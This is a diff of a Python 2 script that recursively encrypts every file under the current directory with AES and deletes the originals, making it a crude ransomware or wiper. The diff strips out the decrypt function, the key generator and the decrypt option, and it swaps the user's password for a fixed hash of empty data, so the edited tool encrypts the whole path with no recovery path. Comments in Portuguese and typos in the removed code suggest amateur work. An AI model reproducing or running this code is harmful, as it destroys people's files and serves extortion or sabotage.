@@ -62,25 +62,6 @@ def encrypt(key, filename):
  
                                 outfile.write(encryptor.encrypt(chunk))
  
- 
-def decrypt(key, filename):
-        outFile = os.path.join(os.path.dirname(filename), os.path.basename(filename[11:]))
-        chunksize = 64 * 1024
-        with open(filename, "rb") as infile:
-                filesize = infile.read(16)
-                IV = infile.read(16)
- 
-                decryptor = AES.new(key, AES.MODE_CBC, IV)
-               
-                with open(outFile, "wb") as outfile:
-                        while 1:
-                                chunk = infile.read(chunksize)
-                                if len(chunk) == 0:
-                                        break
- 
-                                outfile.write(decryptor.decrypt(chunk))
- 
-                        outfile.truncate(int(filesize))
        
 def allfiles():
         allFiles = []
@@ -89,19 +70,8 @@ def allfiles():
                         allFiles.append(os.path.join(root, names))
  
         return allFiles
-# essa função não está retornando a senha gerada... help me!!!!!
-
-def generated_key(size):
-        caracters = '~{}^=+()@#$%*¨&ABCDEFGHIJKLMNOPQRSTUVXZY0123456789abcdefghijlmnopqrstuwvxz'
-        password = ''
-        for char in xrange(soze):
-                password += choice(caracters)
-        return password
-print generated_key
-###
-password = raw_input("Generatedd the key?")      
-choice = raw_input("Do you want to (E)ncrypt or (D)ecrypt? ")
-
+    
+choice = raw_input("Do you want to (E)ncrypt the whole path?" '[E]\n')
 
 encFiles = allfiles()
  
@@ -114,29 +84,10 @@ if choice == "E":
                 elif Tfiles == os.path.join(os.getcwd(), sys.argv[0]):
                         pass
                 else:
-                        encrypt(SHA256.new(password).digest(), str(Tfiles))
+                        encrypt(SHA256.new(data=None).digest(), str(Tfiles))
                         print "Done encrypting %s" %str(Tfiles)
                         os.remove(Tfiles)
  
-elif choice == "D":
-        filename = raw_input("Enter the filename to decrypt: ")
-        if not os.path.exists(filename):
-                print "The file does not exist"
-                sys.exit(0)
-        elif not filename.startswith(".hell"):
-                print "%s is already not encrypted" %filename
-                sys.exit()
-        else:
-                decrypt(SHA256.new(password).digest(), filename)
-                
-                print "Done decrypting %s" %filename
-                
-                os.remove(filename) 
-### passar a senha em um I/O e para um arquivo em texto..... 
-elif password == 'G':
-        
-         print password
-                  
  
 else:
         print "Please choose a valid command."
